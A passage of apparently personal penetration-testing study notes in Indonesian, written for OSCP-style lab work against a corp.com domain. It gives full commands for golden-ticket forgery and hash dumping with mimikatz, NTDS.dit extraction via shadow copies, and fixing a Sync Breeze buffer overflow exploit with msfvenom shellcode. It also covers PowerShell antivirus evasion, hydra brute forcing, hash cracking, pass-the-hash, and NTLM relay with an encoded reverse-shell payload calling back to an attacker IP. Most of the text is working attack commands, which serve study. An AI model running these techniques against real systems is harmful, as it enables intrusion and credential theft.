PsExec64.exe \\DC1 cmd.exe
```

Jadi kita perlu melakukan ekstraksi menggunakan mimikatz untuk mengambil hash krbtgt

```
privilege::debug
lsadump::lsa /patch
```

Setelah mendapat hash krbtgt kita bisa melakukan serangan kembali menggunakan mimikatz, tapi sebelum itu kita perlu mengosongkan ticket pada machine kita

```
kerberos::purge
```

dan payload fullnya 

```
//sid bisa diambil dari : whoami /user or Get-DomainController -LDAP | Select objectsid

kerberos::golden /user:jen /domain:corp.com /sid:S-1-5-21-1987370270-658905905-1781884369 /krbtgt:1693c6cefafffc7af11ef34d1c788f47 /ptt


//untuk aktifkan session cmd
misc::cmd
```

Yang jika kita verifikasi menggunakna psexec seharusnya berhasil

```
PsExec.exe \\dc1 cmd.exe

//verifikasi dengan 
whoami /groups
```

##### Shadow Copy

Shadow copy merupakan teknologi backup pada microsoft yang dapat digunakan untuk membuat suatu snapshot file atau volume. binary yang digunakan yaitu vshadow.exe dan kita dapat membuat shadow copy untuk melakukan ekstarksi file database active directory NTDS.dit dan hive system untuk mendapatkan semua hash user pada domain.


Command ini digunakan untuk disable writter untuk mempercepat proses pencadangan
```
vshadow.exe -nw -p  C:
```

Lalu lanjut untuk copy ke folder root C:
```
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit c:\ntds.dit.bak


//dan kemudian ekstrak hive system
reg.exe save hklm\system c:\system.bak

//setelah itu pindahkan pada local machine kita 
in kali : sudo impacket-smbserver share . -smb2support -user kali -password kali

in windows :
copy system.bak x:
copy ntds.dit.bak x:

```

kemudain extract menggunakan impacket-secretdump

```
impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL
```

##### Fixing exploit
Jadi disini kita akan belajar cara mempelajari untuk mempatching suatu public exploit. kebetulan disini ada semacam kerentanan buffer overflow pada software Sync Breeze Enterprise 10.0.28

```
searchsploit "Sync Breeze Enterprise 10.0.28"

//output: 
Sync Breeze Enterprise 10.0.28 - Remote Buffer Overflow (PoC) | windows/dos/42341.c


//kita bisa copy dengan :
searchsploit -m windows/dos/42341.c
```

karena format C, maka kita perlu melakukan cross compile menjadi executable menggunakan mingw

```
i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe

output:
/usr/bin/i686-w64-mingw32-ld: /tmp/cchs0xza.o:42341.c:(.text+0x97): undefined reference to `_imp__WSAStartup@8'
```

Terdapat kesalahan karena undefined WAStartup yang berarti linker tidak menemukan library winsock dan tinggal tambahkan opsi -lws2_32

```
i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe -lws2_32
```

Beberapa hal perlu diubah agar exploit bekerja, sepert host, port dan beberapa hardcode lainnya. terutama pada bagian 

```
unsigned char retn[] = "\x83\x0c\x09\x10";
```
yang merupakan intruksi JMP ESP, intruksi ini berperan untuk melakukan jump ke register ESP yang jika kita timpa dengan address shellcode(awal stack sesuai dengan alamat ESP), maka program akan melakukan eksekusi pada shellcode kita alih alih berjalan normal.

generate menggunakan msfvenom dengan encode shikata_ga_nai dan menghapus bad char
```
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.237 LPORT=443 EXIFUNC=thread -f c -e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d"
```

Setelah itu lanjut set breakpoint pada intruksi JMP ESP di 0x10090c83, dan jika kita run dengan 

```
sudo wine syncbreeze_exploit.exe
```
hasilnya breakpoint tidak pernah berhenti, ini berarti ada kesalah offset pada payload kita yang pada intruksi EIP akan melompat ke 0x9010090c, dan tampaknya offset kita kurang 1 byte ini karena fungsi seperti strcat akan mengatur karakter terakhit ke null byte yang pada akhirnya panjang payload kita ada 779.

yang perlu kita ubah yaitu dengan menambahkan 1 byte

```
    int initial_buffer_size = 781;
```

dan selanjutnya jika dieksekusi, maka payload akan bekerja

#### learn day 17


Jadi di module ini terkait dengan antivirus evasion, dan untuk prakteknya kita akan memakai beberapa pendekatan seperti melakukan bypass dengan powershell reflection maupun automation dengan shelter.

Contoh pertama kita akan menggunakan powershell, jadi kita bisa melakukan generate function powershell dengan msfvenom

```
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.50.1 LPORT=443 -f psh-reflection
```

dan kemudian kita buat menggunakan serangkaian windows API

```
$code = '
[DllImport("kernel32.dll")]
public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

[DllImport("kernel32.dll")]
public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

[DllImport("msvcrt.dll")]
public static extern IntPtr memset(IntPtr dest, uint src, uint count);';

function xf {
        Param ($nfCl, $vf)
        $uaQP = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')

        return $uaQP.GetMethod('GetProcAddress', [Type[]]@([System.Runtime.InteropServices.HandleRef], [String])).Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($uaQP.GetMethod('GetModuleHandle')).Invoke($null, @($nfCl)))), $vf))
}

function xb {
        Param (
                [Parameter(Position = 0, Mandatory = $True)] [Type[]] $jGN_b,
                [Parameter(Position = 1)] [Type] $hh = [Void]
        )
```

Dan jika denied, kita bisa set policy saat ini :

```
Get-ExecutionPolicy -Scope CurrentUser

//set policy
Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser

//set to unristrected 
Get-ExecutionPolicy -Scope CurrentUser

//lalu jalankan 
.\bypass.ps1
```


##### Automation processs
Disini kita juga bisa menggunakan shelter untuk melakukan automation.


install dan use
```
sudo apt install shellter

sudo apt install wine
sudo dpkg --add-architecture i386 && apt-get update &&
apt-get install wine32
```


#### Password attack

Disini kita akan belajar terkait password attack, jadi tekniknya cukup umum seperti dengan melakukan brute force service maupun crack hash.


Contoh serangan ssh menggunakan hydra

```
hydra -l george -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://192.168.107.201

//using list
hydra -L user.txt -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://192.168.107.201

//huruf besar untuk list dan kecil untuk word
```


#### RDP 

Kita akan belajar terkait password spraying disini. jadi ada banyak cara untuk mendapatkan suatu password, bahkan banyak service / platform untuk melakukan checking password yang bocor dan mendapatkannya seperti pada https://scatteredsecrets.com/

Spray password berarti, kita menggunakan satu set password yang sama dari kumpulan username, contohnya : 

```
hydra -L /usr/share/wordlists/dirb/others/names.txt -p "SuperS3cure1337#" rdp://192.168.50.202
```


#### HTTP

Saat melakukan pentest, kita akan banyak berhadapan dengan website / http, jadi kita bisa memanfaatkan form data dan melakukan brute force.

contoh command : 
```
hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.50.201 http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid"


//https 
hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.50.201 https-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid"
```

Contoh diatas kita menggunakan username "user" dan password yang diambil dari rockyou.txt, lalu pada bagian terakhir :, merupakan acuan saat kata sandi salah yang berarti kita bisa menyesuaikan hal tsb

#### Learn day 18

Masih di module password attack, jadi kita akan mempelajari lebih dalam lagi tentang teori maupun prakteknya.

disini kita belajar mengenali perbedaan dari encryption, hash dan cracking. kita bahas dasar enkripsi, dan enkripsi merupakan fungsi 2 arah yang bisa dilakukan pengacakan dan penyusunan ulang menggunakan setidaknya 1 kunci. Daya yang di enkripsi disebut cipher text.

2 jenis enkripsi yaitu :
- asymetric : menggunakan kunci private / public
- symetric : menggunakan 1 kunci

Disisi lain ada hash / digest yang merupakan output dari suatu plaintext yang diolah melalui serangkaian algoritma(md5, sha1, bcrypt dll) dengan hasil nilai hexa dengan panjang tetap/static.

contoh hash dengan sha256 :

```
echo -n "secret" | sha256sum


//output hash berbeda jika string yang di input berbeda
echo -n "secret1" | sha256sum
```

2 tools powerfull untuk melakukan cracking kita bisa menggunakan john the ripper dan hashcat, tapi sebelum kita melakukan cracking, kita perlu kalkulasi waktu cracking dari representasi hashnya. Sebagai contoh, jika kita menggunakan password dengan kemungkinan alfabet huruf besar dan kecil yang berarti 26 x 2 + angka 0 - 9 berarti 62

dimana 62 ini dipangkatkan dengan kemungkinan length password. yang berarti :

```
echo -n "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789" | wc -c

python3 -c "print(62**5)"
//output: 916132832
```

untuk 5 character sendiri kita memiliki keyspace 916132832, setelah itu kita membutuhkan hashrate(ukuran perhitungan hash dalam 1 detik) untuk menghitung waktu cracking.

menggunakan hashcat dengan opsi -b

```
hashcat -b
```

comman ini merupakan benchmarking untuk menampilkan speed hash pada hashcat dengan contoh md5 

```
-------------------
* Hash-Mode 0 (MD5)
-------------------

Speed.#1.........: 47815.2 kH/s (17.04ms) @ Accel:256 Loops:1024 Thr:1 Vec:8

```
speed ditunjukkan pada hH/s atau MH/s dimana MH/s sama dengan 1.000.000 hash per detik, jadi perhitungannya adalah keyspace / hashrate

misalkan : 

```

python3 -c "print(916132832 / 134200000)"
//output: 6.826623189269746

python3 -c "print(916132832 / 9276300000)"
//output:  0.09876058687192092
```

Disini output 1, menunjukkan hash bisa dipecahkan dalam waktu sekitar 7 detik dan output 2 menunjukkan hash pecah dalam waktu kurang dari 1 detik



#### Mutating wordlist

rule-based attack, dimana attacker memodifikasi wordlist sesuai dengan aturan yang ditentukan. Terkadang beberapa platform / layanan seringkali menerapkan password policy jadi pengguna diharuskan menggunakan password dari serangkaian character huruf besar maupun angka.

Menggunakan hashcat, kita bisa menambahkan rule kita sendiri

```
echo \$1 > demo.rule
```

Disini kita menambahkan character 1 pada akhir password

```
hashcat -r demo.rule --stdout pass.txt 

//output: 
password1
iloveyou1
princess1
rockyou1
abc1231
```

Kita juga bisa agar password, pada awal character menggunakan kapital menggunakan rule 'c'

```
cat demo1.rule                                                

//output:
$1 c

hashcat -r demo1.rule --stdout pass.txt

//output:
Password1
Iloveyou1
Princess1
Rockyou1
Abc1231
```

dan bisa juga menambahkan special character seperti !, contoh

```
cat demo1.rule

//output : $1 c $!

hashcat -r demo1.rule --stdout demo.txt
Password1!
Iloveyou1!
Princess1!
Rockyou1!
Abc1231!
```
Kita juga bisa membuat lebih dari 1 line rule seperti :

```
$1 c $!
$2 c $!
$1 $2 $3 c $!
```

artinya kita membuat 3 rule dan password kita akan dilakukan permutation. 

setelah itu execute 

```
hashcat -m 0 crackme.txt /usr/share/wordlists/rockyou.txt -r demo3.rule --force
```

atau kita juga bisa menggunakan rule khusus yang disediakan hashcat pada file 

```
ls -la /usr/share/hashcat/rules/
```


selanjutnya, sebelum melakukan cracking kita perlu mengerti dulu jenis hash yang digunakan

```
//menggunakan hashid
hashid '$2y$10$XrrpX8RD6IFvBwtzPuTlcOqJ8kO2px2xsh17f60GZsBKLeszsQTBC'

//menggunakan hash-identifier
hash-identifier '4a41e0fdfb57173f8156f58e49628968a8ba782d0cd251c6f3e2426cb36ced3b647bf83057dabeaffe1475d16e7f62b7'
```


##### Password manager
Selanjutnya kita akan belajar terkait password manager, umumnya di windows sendiri file credential password manager menggunakan ekstensi kdbx

contoh untuk mencari rekursif

```
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
```

Lalu jika ditemukan, pindah pada machine kali kita dan selanjutkan kita perlu melakukan konversi ke hash yang dapat dibaca menggunakan ssh2john atau keepass2john

```
keepass2john Database.kdbx > keepass.hash

cat keepass.hash                                              
//output
Database:$keepass$*2*60*0*d74e29a727e9338717d27a7d457ba3486d20dec73a9db1a7fbc7a068c9aec6bd*04b0bfd787898d8dcd4d463ee768e55337ff001ddfac98c961219d942fb0cfba*5273cc73b9584fbd843d1ee309d2ba47*1dcad0a3e50f684510c5ab14e1eecbb63671acae14a77eff9aa319b63d71ddb9*17c3ebc9c4c3535689cb9cb501284203b7c66b0ae2fbf0c2763ee920277496c1

//remove string "Database"
$keepass$*2*60*0*d74e29a727e9338717d27a7d457ba3486d20dec73a9db1a7fbc7a068c9aec6bd*04b0bfd787898d8dcd4d463ee768e55337ff001ddfac98c961219d942fb0cfba*5273cc73b9584fbd843d1ee309d2ba47*1dcad0a3e50f684510c5ab14e1eecbb63671acae14a77eff9aa319b63d71ddb9*17c3ebc9c4c3535689cb9cb501284203b7c66b0ae2fbf0c2763ee920277496c1
```

selanjutnya cari type pada hashcat 

```
hashcat --help | grep -i "KeePass"
```

selanjutnya lakukan execute 

```
hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force

//rule bisa diubah sesuai kebutuhan
```


#### passphrase private key SSH

pada banyak kasus, private key ssh ditambahkan passphrase jadi untuk menggunakannya kita perlu mengerti passphrase yang digunakan

contohnya seperti ini 

```
ssh -i id_rsa dave@192.168.174.201 -p 2222
The authenticity of host '[192.168.174.201]:2222 ([192.168.174.201]:2222)' can't be established.
ED25519 key fingerprint is SHA256:SxEapuin3GJsdhOqDdFrm+ncv8/8UU+a8npW7OKfREk.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[192.168.174.201]:2222' (ED25519) to the list of known hosts.
Enter passphrase for key 'id_rsa': 
```

yang dimana key meminta input passphrase dan disini kita bisa menggunakan john untuk melakukan ekstraksi hash

```
ssh2john id_rsa > ssh.hash
```

file disimpan pada ssh.hash, sekarang lanjut analisis file note.txt yang kita temukan diserver 

```
Dave's password list:

Window
rickc137
dave
superdave
megadave
umbrella

Note to myself:
New password policy starting in January 2022. Passwords need 3 numbers, a capital letter and a special character
```
Password policy bisa kita buat sendiri berdasarkan file notes.txt dengan klasifikasi berikut:
- ada tambahan angka 137
- password  Window dimulai menggunakan upper case
- dan ada catatan special char jadi kita akan menggunakan (!, @, #)

jadi rulesnya seperti berikut: 

```
c $1 $3 $7 $!
c $1 $3 $7 $@
c $1 $3 $7 $#
```

jika kita menggunakan hashcat seperti 
```
hashcat -m 22921 ssh.hash ssh.passwords -r ssh.rule --force
```

maka akan terdapat kesalahan, intinya hashcat mode 22921 tidak support pada hash ssh kita jadi kita akan menggunakan john the ripper untuk ini

kita buat rules untuk john the ripper

```
[List.Rules:sshRules]
c $1 $3 $7 $!
c $1 $3 $7 $@
c $1 $3 $7 $#
```

selanjutnya, kita akan menginputkan di file /etc/john/john.conf agar rule bisa kita load

```
sudo sh -c 'cat /home/kali/oscp/password-cracking/ssh.rules >> /etc/john/john.conf'

//run 
john --wordlist=ssh-pass.txt --rules=sshRules ssh.hash
```

setelah itu login ssh dan masukan passphrase

```
ssh -i id_rsa dave@192.168.174.201 -p 2222
```



##### Working with password hash

pada unit ini kita akan belajar bagaimana mendapatkan hash dan menggunakan hash untuk mendapatkan akses ke system lain pada operating system windows.

Windows menyimpan password dan credential pada file SAM(Security Account Manager) yang digunakan untuk authentikasi user local dan remote. NTLM juga disimpan pada database SAM

SALT merupakan bit random yang ditambahkan pada password sebelum di hash. jadi di unit ini kita akan menggunakan mimikatz untuk melakukan ekstraksi hash. mimikatz melakukan ekstraksi dari berbagai sumber windows, salah satunya LSASS yang merupakan process untuk menghandle authentikasi user, password update dan pembuatan token akses . Penggunaan mimikatz harus dijalankan pada user administrator atau privilege tinggi.

command untuk dump SAM
```
.\mimikatz.exe

//mode debug dan cek privilege 
privilege::debug

//untuk meningkatkan ke privilge system
token::elevate

//lanjut dump sam
lsadump::sam
```

selanjutnya cek hash mode pada hashcat untuk lanjut cracking

```
hashcat --help | grep -i "ntlm"

//output di 1000
```

lalu lakukan cracking 
```
hashcat -m 1000 nelly.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```


#### Pass the Hash

Selanjutnya kita akan menggunakan pass the hash. jadi tanpa password plain-text, kita bisa melakukan auth hanya dengan hash NTLM. 

Beberapa tools dan command yang digunakan untuk melakukan pass-the-hash attack

```
smbclient \\\\192.168.50.212\\secrets -U Administrator --pw-nt-hash 7a38310ea6f0027ee955abed1762964b

impacket-psexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.50.212

impacket-wmiexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.50.212
```

perbedaan besarnya pada psexec dan wmiexec yaitu jika pada psexec kita akan selalu mendapatkan shell interaktif sebagai system, tapi pada wmiexec kita mendapatkan shell sebagai user yang sesuai pada saat authentikasi.


#### NTLMv2
pada banyak kasus, kita tidak bisa melakukan ekstraksi hash dan menjalankan mimikatz karena bukan privilege tinggi. Alternatifnya, kita bisa memanfaatkan protokol network authentication(_Net-NTLMv2_) 

dasar proses authentikasi client dan server melalui Net-NTLMv2:
- client mengirimkan request ke server untuk akses SMB
- server meresponse "challenge" ke client
- client melakukan enkripsi data dengan hash NTLM
- server validasi response challenge apakah diizinkan atau ditolak

Disini kita bisa menyalahgunakan dengan meniru service yang sesuai dan meminta server untuk melakukan authentikasi menggunakan protocol NTLM, yang kemudian kita bisa menangkap hashnya.

Disini kita akan menggunakan responder, dengan skenario berikut

kita punya akses reverse shell pada user paul pada privilege rendah, tapi paul ini masuk ke group remote desktop user. jadi untuk mendapatkan NTLM hashnya kita perlu setup service tiruan kita pada host local menggunakan responder

```

//interface disesuakan
sudo responder -I tun0

//pada shell paul dan IP disesuakan
C:\Windows\system32>dir \\192.168.45.161\test
```

Cek output responder, seharusnya NTLM berhasil di capture lalu lanjut cracking hashcat
```
//cek mode
hashcat -hh | grep -i "ntlm"

//cracking
hashcat -m 5600 paul.hash /usr/share/wordlists/rockyou.txt --force
```

##### Relai NTLM

sebagian besar kasus, hash NTLM tidak bisa dilakukan cracking dan jika skenarionya seperti itu kita bisa juga mencoba memanfaatkan serangangan relay NTLM. Jadi cara kerjanya seperti ini :

- attacker setup relay NTLM
- attacker menjalankan auth NTLM(dir \\ip\test)
- alih alih hanya meresponse hash, request akan diteruskan ke service lain
- jika authentikasi berasal dari admin, kita juga bisa melakukan command pada psexec dan wmiexec


jadi disini kita akan menggunakan ntlmrelayx pada module impacket dan melakukan eksekusi reverse shell.

pertama kita generate payload revshellnya

```
python3 generate-revshell.py 192.168.45.161192.168.45.161 443
```

lalu jalankan ntlmrelayx dengan opsi -t IP yang merupakan host2 atau dengan kata lain request kita akan di forward ke IP 192.168.174.211
```
impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.174.211 -c "powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADEANgAxACIALAA0ADQAMwApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA"
```

selanjutnya jalankan revshell pada port 443

```
nc -lnvp 443
```

lalu pada host 1, komunikasikan dengan host kita yang sudah running ntlmrelayx

```
dir \\192.168.45.161\test
```
seharusnya, listener kita menerima koneksi shell pada host2



##### Windows credential guard

kita diatas belajar terkait hash pada akun local. namun pada saat melakukan penetration testing, kita akan menemukan jenis akun lain misalkan akun user dalam domain. Jika pada local semua informasi akun disimpan pada SAM sementara pada domain, informasi akun disimpan dalam proses lsass.exe.

Mimikatz bisa melakukan dump hash dari user domain, dengan syarat pengguna domain pernah masuk pada host yang akan kita jalankan mimikatz, sebagai contoh kita akan masuk sebagai administrator pada host client26

```
xfreerdp3 /u:"CORP\\Administrator" /p:"QWERTY123\!@#" /v:192.168.174.248 /sec:nla /dynamic-resolution
```

setelah itu logout dan ganti user offsec(admin local)

```
xfreerdp3 /u:offsec /p:lab /v:192.168.174.246 /sec:nla /dynamic-resolution
```
Karena sebelumnya administrator sudah login pada client26, selanjutnya kita jalankan mimikatz untuk melakukan dump

```
C:\tools\mimikatz\mimikatz.exe

privilege::debug
sekurlsa::logonpasswords
```

Seharusnya bagian output menunjukkan NTLM dari administrator beserta informasi logon server.

dan kita bisa menggunakan wmiexec untuk terhubung ke server

```
impacket-wmiexec -debug -hashes 00000000000000000000000000000000:160c0b16dd0ee77e7c494e38252f7ddf CORP/Administrator@192.168.174.248
```

Teknik ini sebenarnya sudah dilakukan mitigasi oleh microsoft, yaitu dengan menerapkan Virtualization-Based Security/VBS yang merupakan teknologi virtualisasi hardware yang disediakan oleh CPU dengan fitur untuk melakukan isolasi wilayah memory.

VBS menjalankan hypervisor pada hardware bukan pada operating system dan di implementasikan melalui hyper-v(hypervisor asli microsoft) dan selain itu, microsoft juga mengembangkan VSM(Virtual Secure Mode) yang merupakan kemampuan pada partisi hyper-v

VSM menciptakan area terisolasi di memory yang menyimpan info sensitive, dan area ini hanya dapat diakses melalui hypervisor yang berjalan pada hak akses sangat tinggi daripada kernel. Artinya meskipun privilege kita nt system, tetap saja kita tidak bisa mengakses area tersebut

VSM membagi isolasi melalui beberapa level VTL(Virtual Trust Level), dan tiap vtl memiliki tiap bagian area memory dan saat ini mempunyai 16 level VTL-1 sampai VTL-16

Di module ini kita akan fokus pada mitigasi credential guard. saat diaktifkan, LSASS berjalan sebagai trustlet di VTL1 dengan nama LSAISO.exe(LSA ISOLATED) yang berkomunikasi dengan LSASS pada VTL0 melalui RCP.

mimikatz menelususri lsass.exe untuk dumping semua informasi credential, tapi saat credential guard aktif semua process baru disimpan pada VTL-1 bukan lsass.exe, artinya kita tidak bisa melakukan dump karena terisolasi 

untuk identifikasi, kita bisa menggunakan command : 

```
Get-ComputerInfo
```
Apakah terdapat string seperti 

```
DeviceGuardSecurityServicesConfigured: {CredentialGuard, HypervisorEnforcedCodeIntegrity, 3}
DeviceGuardSecurityServicesRunning : {CredentialGuard, HypervisorEnforcedCodeIntegrity}
```

Jika ada, berarti target sudah menerapkan credential guard dan jika kita running mimikatz maka kita tidak akan melihat hash yang dicache. Tapi pentingnya, credential guard hanya melindungi user non-local jadi kita masih bisa melakukan dump pada user local.

Jadi cara satu satunya bukan melakukan dump, tapi melakukan intercept user yang login ke server, yaitu dengan memanfaatkan mekanisme auth SSPI(Security Support Provider Interface) dan secara default, windows menyediakan SSP seperti kerberos security support provider dan ntlm security support provider dan SSP diintegrasikan ke dalam SSPI sebagai DLL.

Jika kita mengembangkan SSP sendiri dan register ke LSASS, kemungkinan bisa memaksa SSPI untuk menggunakan DLL security support provider berbahaya kita untuk auth.

untungya mimikatz menyediakan hal ini melalui memssp, jadi kita bisa intercept plain-text user yang login.

pada user offsec :

```
privilege::debug

//untuk melakukan inject SSP
misc::memssp
```

Jadi kita hanya perlu menunggu seseorang melakukan authentikasi, anggaplah case kali ini administrator melakukan koneksi RDP
```
xfreerdp /u:"CORP\\Administrator" /p:"QWERTY123\!@#" /v:192.168.50.245 /dynamic-resolution
```

Setelah itu, kredensial akan disimpan di file log

```
C:\Windows\System32\mimilsa.log

//read 
type C:\Windows\System32\mimilsa.log

//output:
Nz*N;DVtP+G]imZ_6MBkb:#Wq&8eo/fU@eBq+;CXt
[00000000:00af2311] CORP\Administrator  QWERTY123!@#
[00000000:00404e84] CORP\Administrator  Šd
[00000000:00b16d69] CORP\CLIENTWK245$   R3;^LTW*0g4o%bQo1M[L=OCDDR>%$ 
```

Disini kita berhasil mendapatkan password administrator melalui memssp pada mimikatz
